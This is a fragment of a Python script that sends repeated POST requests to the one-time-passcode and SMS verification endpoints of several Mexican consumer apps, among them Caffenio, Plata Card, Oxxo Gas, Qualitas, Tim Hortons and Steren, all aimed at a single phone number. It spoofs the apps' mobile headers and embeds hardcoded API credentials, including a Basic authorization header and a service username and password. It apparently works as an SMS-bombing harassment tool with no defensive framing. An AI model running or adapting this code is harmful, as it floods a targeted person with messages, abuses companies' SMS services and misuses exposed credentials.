    "DataValidation": USER
}

headers = {
    "Host": "superapp.caffenio.com",
    "Content-Type": "application/json",
    "Accept": "/",
    "Ostype": "ios",
    "Appversion": "2.0.7",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "Caffenio/252 CFNetwork/1568.200.51 Darwin/24.1.0",
    "Language": "es",
    "Apprelease": "4",
    "Osversion": "18.1.1"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


# Generar IDPLATA (GUID)
IDPLATA = str(uuid.uuid4())

url = "https://prime.platacard.mx/auth/api/v1/auth-flow/otp/send"

payload = {
    "phoneNumber": f"+52{USER}",
    "installationId": IDPLATA
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/json"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://api.spinplatform.digital/tr/superback/otp/v1/send"

payload = {
    "phoneNumber": f"+52{USER}",
    "channel": "SMS",
    "message": "Recuerda no compartir este código. Tu código de verificación OxxoGas",
    "templateId": "spin_premia_oxxo_gas",
    "type": "NUMERIC",
    "serviceCode": "Onboarding",
    "timeExpiration": ""
}

headers = {
    "Host": "api.spinplatform.digital",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "OXXO%20GAS/3 CFNetwork/3826.500.131 Darwin/24.5.0",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Content-Length": "231",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


# -------------------------------
# REQUEST
# -------------------------------
url = "https://api.spinplatform.digital/tr/superback/otp/v1/send"

payload = {
    "phoneNumber": f"+52{USER}",
    "channel": "SMS",
    "message": "Recuerda no compartir este código. Tu código de verificación OxxoGas",
    "templateId": "spin_premia_oxxo_gas",
    "type": "NUMERIC",
    "serviceCode": "Onboarding",
    "timeExpiration": ""
}

headers = {
    "Host": "api.spinplatform.digital",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "OXXO%20GAS/3 CFNetwork/3826.500.131 Darwin/24.5.0",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Content-Length": "231",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

# -------------------------------
# ENVÍO DEL REQUEST
# -------------------------------
r = requests.post(url, headers=headers, json=payload)

# -------------------------------
# RESPUESTA (SIEMPRE INCLUIR)
# -------------------------------
print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


# -------------------------------
# REQUEST
# -------------------------------
url = "https://qmovil.qualitas.com.mx/agentes/qmovil-serv/rest/registro/telefono"

payload = {
    "telefono": USER,
    "uuid": "554B7910-E5C6-4CCF-A88E-499D2799B866",
    "hash": "",
    "whats": True
}

headers = {
    "Host": "qmovil.qualitas.com.mx",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Authorization": "Basic cW0tcmVzdDpxTTB2MWwtRzAx",
    "Sec-Fetch-Site": "cross-site",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Fetch-Mode": "cors",
    "Origin": "capacitor://localhost",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Content-Length": "94",
    "Sec-Fetch-Dest": "empty"
}

# -------------------------------
# ENVÍO DEL REQUEST
# -------------------------------
r = requests.post(url, headers=headers, json=payload)

# -------------------------------
# RESPUESTA
# -------------------------------
print(r.status_code)
print(r.cookies.get_dict())
print(r.text)


# -------------------------------
# REQUEST
# -------------------------------
url = "https://qmovil.qualitas.com.mx/agentes/qmovil-serv/rest/registro/telefono"

payload = {
    "telefono": USER,
    "uuid": "554B7910-E5C6-4CCF-A88E-499D2799B866",
    "hash": "",
    "sms": True
}

headers = {
    "Host": "qmovil.qualitas.com.mx",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Authorization": "Basic cW0tcmVzdDpxTTB2MWwtRzAx",
    "Sec-Fetch-Site": "cross-site",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Fetch-Mode": "cors",
    "Origin": "capacitor://localhost",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Content-Length": "94",
    "Sec-Fetch-Dest": "empty"
}

# -------------------------------
# ENVÍO DEL REQUEST
# -------------------------------
r = requests.post(url, headers=headers, json=payload)

# -------------------------------
# RESPUESTA
# -------------------------------
print(r.status_code)
print(r.cookies.get_dict())
print(r.text)

URL = "https://app-back-prodkub.timhortonsmx.com/th-app/otp/search"

headers = {
    "Accept": "*/*",
    "User-Agent": "Tim Hortons/1.3.7 (mx.timhortons.th; build:1370; iOS 26.1.0) Alamofire/5.10.2",
    "Accept-Language": "es-MX;q=1.0",
    "Content-Type": "application/json",
    "Connection": "keep-alive",
}

data = {
    "phone": f"+52{USER}"
}

r = requests.post(URL, headers=headers, json=data, timeout=15)
print(r.status_code)
print(r.cookies.get_dict())
print(r.text)


URL = "https://app-back-prodkub.timhortonsmx.com/th-app/otp/generate"

headers = {
    "Accept": "*/*",
    "User-Agent": "Tim Hortons/1.3.7 (mx.timhortons.th; build:1370; iOS 26.1.0) Alamofire/5.10.2",
    "Accept-Language": "es-MX;q=1.0",
    "Content-Type": "application/json",
    "Connection": "keep-alive",
}

data = {
    "phone": f"+52{USER}"
}

r = requests.post(URL, headers=headers, json=data, timeout=15)
print(r.status_code)
print(r.cookies.get_dict())
print(r.text)


# =========================
# 1) GENERAR TOKEN STEREN
# =========================
URL_AUTH = "https://fyi.steren.com.mx/SrvStereCardAppsV2/api/login/authenticate"

headers_auth = {
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "SterenCard/58 CFNetwork/3860.200.71 Darwin/25.1.0",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Content-Type": "application/json",
    "Connection": "keep-alive",
}

data_auth = {
    "User": "SrvSCAppV2",
    "Password": "{V{|KFm]DT+M9n-0f#<_RN(f)CMWJ>",
    "IdApp": "9"
}

r_auth = requests.post(URL_AUTH, headers=headers_auth, json=data_auth, timeout=15)
print("AUTH STATUS:", r_auth.status_code)
print(r_auth.text)

TOKENSTEREN = r_auth.json().get("Token")

# =========================
# 2) ENVIAR SMS STEREN
# =========================
URL_SMS = "https://fyi.steren.com.mx/SrvStereCardAppsV2/api/messages/sendCode"

headers_sms = {
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "SterenCard/58 CFNetwork/3860.200.71 Darwin/25.1.0",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {TOKENSTEREN}",
    "Connection": "keep-alive",
}

data_sms = {
    "UserName": USER,
    "IdClient": USER,
    "IdPais": "MX"
}

r_sms = requests.post(URL_SMS, headers=headers_sms, json=data_sms, timeout=15)
print("SMS STATUS:", r_sms.status_code)
print(r_sms.text)
